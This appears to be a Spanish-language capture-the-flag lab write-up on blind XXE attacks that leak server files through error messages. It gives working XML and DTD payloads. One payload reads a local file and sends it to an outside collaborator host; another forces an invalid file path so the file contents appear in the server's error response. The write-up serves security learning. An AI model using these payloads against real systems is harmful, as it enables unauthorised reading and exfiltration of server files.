En esta clase abordamos una variante de XXE ciega que se apoya en mensajes de error para filtrar información sensible. Continuamos aprovechando el sistema de entidades parametrizadas, pero en lugar de usar canales externos como Collaborator, utilizamos rutas inválidas para provocar errores intencionados que revelen el contenido del archivo /etc/passwd.

Preparamos una DTD maliciosa en nuestro exploit server que lee ese archivo y lo introduce como parte de una ruta errónea. Al invocar esa DTD desde el XML enviado al endpoint vulnerable, el servidor intenta acceder a una ruta inválida que incluye el contenido del archivo, lo que provoca un error con el texto completo de la entidad.

Analizamos cómo estructurar correctamente tanto la DTD como el XML final y validamos el resultado observando la aparición del archivo dentro del mensaje de error devuelto. Esta técnica demuestra cómo aprovechar los errores internos del servidor como canal de exfiltración en ataques ciegos

-----

Hacemos lo mismo que en laboratorios anteriores, probamos cada uno de los XXE que hemos visto

Primero, detectamos el XXE, y la mandamos llamar el exploit server:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-server/" > %xxe;]>
<productId>
1
</productId>
```

#### Desde el Exploit Server

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://colaborator.com/?content=%file;'>">
%eval;
%exfil;
```

Vemos que con el script anterior, no es posible hace la solicitud correctamente, ya que nos muestra errores en la respuesta de la peticion

Para ello, nos aprovechamos del error, para hacer lo siguiente:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///noexiste/%file;'>">
%eval;
%exfil;
```

